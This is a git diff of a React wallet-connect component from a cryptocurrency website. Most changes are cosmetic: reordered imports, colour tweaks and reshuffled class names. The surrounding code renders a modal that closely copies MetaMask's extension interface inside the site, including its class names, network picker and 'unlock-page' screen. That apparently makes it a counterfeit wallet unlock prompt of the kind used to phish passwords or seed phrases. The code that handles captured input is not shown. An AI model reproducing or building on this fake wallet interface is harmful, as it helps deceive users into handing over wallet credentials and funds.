@@ -1,26 +1,38 @@
-import React, { useEffect, useState } from 'react';
-import { useWeb3React } from '@web3-react/core';
-import { useWalletConnector, setNet } from './WalletConnector.jsx';
+import './index.css';
+
+import React, {
+  useEffect,
+  useState,
+} from 'react';
+
+import CloseIcon from '@mui/icons-material/Close';
+import DoneIcon from '@mui/icons-material/Done';
+import Avatar from '@mui/material/Avatar';
+import Badge from '@mui/material/Badge';
+import Box from '@mui/material/Box';
+import Button from '@mui/material/Button';
+import { green } from '@mui/material/colors';
 import Dialog from '@mui/material/Dialog';
 import DialogActions from '@mui/material/DialogActions';
 import DialogContent from '@mui/material/DialogContent';
 import DialogTitle from '@mui/material/DialogTitle';
-import Button from '@mui/material/Button';
-import Stack from '@mui/material/Stack';
 import IconButton from '@mui/material/IconButton';
-import CloseIcon from '@mui/icons-material/Close';
-import Typography from '@mui/material/Typography';
-import Box from '@mui/material/Box';
-import { EthereumLogo, BinanceLogo } from '../ui/NetworkLogos.jsx';
-import { MetamaskLogo, WalletConnectLogo } from '../ui/WalletLogos.jsx';
-import Avatar from '@mui/material/Avatar';
-import Badge from '@mui/material/Badge';
-import { styled } from '@mui/material/styles';
-import DoneIcon from '@mui/icons-material/Done';
-import { green } from '@mui/material/colors';
 import Modal from '@mui/material/Modal';
+import Stack from '@mui/material/Stack';
+import { styled } from '@mui/material/styles';
 import TextField from '@mui/material/TextField';
-import './index.css';
+import Typography from '@mui/material/Typography';
+import { useWeb3React } from '@web3-react/core';
+
+import { BinanceLogo } from '../ui/NetworkLogos.jsx';
+import {
+  MetamaskLogo,
+  WalletConnectLogo,
+} from '../ui/WalletLogos.jsx';
+import {
+  setNet,
+  useWalletConnector,
+} from './WalletConnector.jsx';
 
 const SmallAvatar = styled(Avatar)(({ theme }) => ({
   width: 22,
@@ -183,7 +195,7 @@ const NetworkWalletProviders = ({
       <DialogTitle id="alert-dialog-title" sx={{ p: 3 }}>
         <Stack direction="row" justifyContent="space-between" spacing={2}>
           <Box>
-            <Typography variant="h6" sx={{ fontWeight: 700 }}>
+            <Typography variant="h6" sx={{ fontWeight: 700, color: 'white' }}>
               Connect Wallet
             </Typography>
           </Box>
@@ -191,7 +203,7 @@ const NetworkWalletProviders = ({
             <IconButton
               onClick={handleWalletProvidersDialogToggle}
               aria-label="close"
-              sx={{ bgcolor: 'grey.100' }}
+              sx={{ bgcolor: 'rgba(111, 126, 140, 0.2)' }}
             >
               <CloseIcon />
             </IconButton>
@@ -279,7 +291,7 @@ const NetworkWalletProviders = ({
           overlay
           aria-labelledby="modal-modal-title"
           aria-describedby="modal-modal-description"
-          transformOrigin={{ horizontal: 'center', vertical: 'top' }}
+          transformorigin={{ horizontal: 'center', vertical: 'top' }}
         >
           <Box sx={style}>
             {during ? (
@@ -318,19 +330,19 @@ const NetworkWalletProviders = ({
             ) : (
               <Box id="app-content">
                 <Box className="app os-win">
-                  <Box className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
+                  <Box className="mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center multichain-app-header-shadow mm-box multichain-app-header mm-box--width-full mm-box--background-color-background-default">
                     <Box
-                      className="mm-box multichain-app-header__lock-contents mm-box--padding-2 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default"
+                      className="multichain-app-header__lock-contents mm-box--display-flex mm-box--justify-content-space-between mm-box--align-items-center mm-box--gap-2 mm-box mm-box--padding-2 mm-box--width-full mm-box--background-color-background-default"
                       style={{ width: '100%' }}
                     >
                       <Box>
                         <Button
-                          className="mm-box mm-picker-network multichain-app-header__contents__network-picker mm-box--padding-right-4 mm-box--padding-left-2 mm-box--display-flex mm-box--gap-2 mm-box--align-items-center mm-box--background-color-background-alternative mm-box--rounded-pill"
+                          className="mm-box--padding-right-4 mm-box--padding-left-2 mm-box--display-flex mm-box--align-items-center mm-box--gap-2 mm-box--rounded-pill mm-box mm-picker-network multichain-app-header__contents__network-picker mm-box--background-color-background-alternative"
                           aria-label="Network Menu Ethereum Mainnet"
                           data-testid="network-display"
                         >
                           <Box
-                            className="mm-box mm-text mm-avatar-base mm-avatar-base--size-xs mm-avatar-network mm-picker-network__avatar-network mm-text--body-xs mm-text--text-transform-uppercase mm-box--display-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-text-default mm-box--background-color-background-alternative mm-box--rounded-full mm-box--border-color-transparent box--border-style-solid box--border-width-1"
+                            className="mm-box--display-flex mm-box--align-items-center mm-box--justify-content-center box--border-style-solid box--border-width-1 mm-box--border-color-transparent mm-box--rounded-full mm-avatar-base--size-xs mm-box--color-text-default mm-text--body-xs mm-text--text-transform-uppercase mm-box mm-text mm-avatar-base mm-avatar-network mm-picker-network__avatar-network mm-box--background-color-background-alternative"
                             role="img"
                           >
                             <img
@@ -339,11 +351,11 @@ const NetworkWalletProviders = ({
                               alt="Ethereum Mainnet logo"
                             ></img>
                           </Box>
-                          <span className="mm-box mm-text mm-text--body-sm mm-text--ellipsis mm-box--color-text-default">
+                          <span className="mm-box--color-text-default mm-text--body-sm mm-text--ellipsis mm-box mm-text">
                             Ethereum Mainnet
                           </span>
                           <span
-                            className="mm-box mm-picker-network__arrow-down-icon mm-icon mm-icon--size-xs mm-box--margin-left-auto mm-box--display-inline-block mm-box--color-icon-default"
+                            className="mm-box--display-inline-block mm-box--margin-left-auto mm-icon--size-xs mm-box mm-picker-network__arrow-down-icon mm-icon mm-box--color-icon-default"
                             style={{
                               maskImage: 'url("./images/icons/arrow-down.svg")',
                             }}
@@ -371,7 +383,7 @@ const NetworkWalletProviders = ({
                       <Box
                         className="unlock-page"
                         data-testid="unlock-page"
-                        style={{ width: '100%' }}
+                        style={{ width: '100%', bgcolor: 'black' }}
                       >
                         <Box className="unlock-page__mascot-container">
                           <Box
